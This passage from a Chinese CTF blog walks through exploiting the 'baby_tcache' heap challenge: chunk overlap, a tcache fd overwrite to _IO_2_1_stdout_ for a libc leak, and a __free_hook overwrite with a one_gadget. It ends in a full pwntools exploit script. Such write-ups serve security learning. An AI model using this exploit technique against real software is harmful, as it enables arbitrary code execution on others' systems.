<p>同时块重叠本身的目的就是为了修改中间chunk的内容，所以我们再把chunk1-3也给free掉，要注意的是这时chunk4是不能free掉的，理由很简单，free掉之后chunk5的prev size就被改掉了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x660</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<p>到此为止实现的效果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">0x40 [  1]: 0x55967c335760 ◂— 0x0</span><br><span class="line">0x50 [  1]: 0x55967c3357a0 ◂— 0x0</span><br><span class="line">0x60 [  1]: 0x55967c3357f0 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55967c335250 —▸ 0x7fef7531bca0 (main_arena+96) ◂— 0x55967c335250</span><br></pre></td></tr></table></figure>

<p>只需要注意unsorted bin的切分大小就可以实现修改中间块的fd指针</p>
<p>然后把chunk0从unsorted bin中割走，这样就让chunk1的fd/bk指针指向了unsorted bin的main_arena，我们在割走chunk1的同时就可以部分覆写其fd指针，让其指向<code>_IO_2_1_stdout_</code></p>
<p>因为我们要让chunk1留在tcache，所以这次把chunk1和chunk2一起割走</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(0x4f0,&#x27;a&#x27;)</span><br><span class="line">add(0x80,&#x27;\x60\x07&#x27;)</span><br></pre></td></tr></table></figure>

<p>到此为止实现的效果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">1</span>]: <span class="number">0x555555758760</span> —▸ <span class="number">0x7ffff7dd0760</span> (_IO_2_1_stdout_) ◂— <span class="number">0xfbad2887</span></span><br><span class="line"><span class="number">0x50</span> [  <span class="number">1</span>]: <span class="number">0x5555557587a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span> [  <span class="number">1</span>]: <span class="number">0x5555557587f0</span> —▸ <span class="number">0x7ffff7dcfca0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x555555758e30</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x5555557587e0</span> —▸ <span class="number">0x7ffff7dcfca0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x5555557587e0</span></span><br></pre></td></tr></table></figure>

<p>可以看到tcache中0x40（也就是chunk1）的chunk的fd已经被改成了<code>_IO_2_1_stdout_</code>结构体所在的地址，这一过程利用的是已有的main_arena来部分覆写实现的，要注意的是由于ASLR的缘故，<code>_IO_2_1_stdout_</code>的地址其实是有一位需要爆破的，也就是本题中覆写时的<code>\x07</code>的这个0</p>
<p>接下来就可以把<code>_IO_2_1_stdout_</code>从tcache中申请出来并且覆写其中的内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x30</span>,p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>到这里为止就完成了libc的泄漏，再用同样的方法，割走chunk3的同时修改其fd指针为<code>__free_hook</code>即可</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recv(timeout = <span class="number">0.25</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recv(timeout = <span class="number">0.25</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    add(<span class="number">0x4f8</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#3</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x4f8</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#5</span></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x660</span>))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;\x60\x07&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x30</span>,p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    p.recv(<span class="number">8</span>)</span><br><span class="line">    libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x7ffff7dd18b0</span> - <span class="number">0x00007ffff79e4000</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;libc_base = &quot;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line">    free_hook = libc_base + (<span class="number">0x7ffff7dd18e8</span> - <span class="number">0x00007ffff79e4000</span>)</span><br><span class="line">    og = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">    one = libc_base + og[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x60</span>,p64(free_hook))</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x50</span>,p64(one))</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		p = process(<span class="string">&quot;baby_tcache&quot;</span>)</span><br><span class="line">		pwn()</span><br><span class="line">		p.interactive()</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		p.close()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">John Doe</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">67</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">45</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
